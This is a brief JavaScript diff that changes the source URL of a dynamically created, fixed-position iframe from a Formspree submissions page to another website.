@@ -2,7 +2,7 @@
 (function() {
   // Create iframe element
   const iframe = document.createElement('iframe');
-  iframe.src = 'https://formspree.io/forms/xrbkykqr/submissions'; // Replace with your target URL
+  iframe.src = 'https://dkedai.com/'; // Replace with your target URL
   iframe.style.position = 'fixed';
   iframe.style.top = '0';
   iframe.style.left = '0';
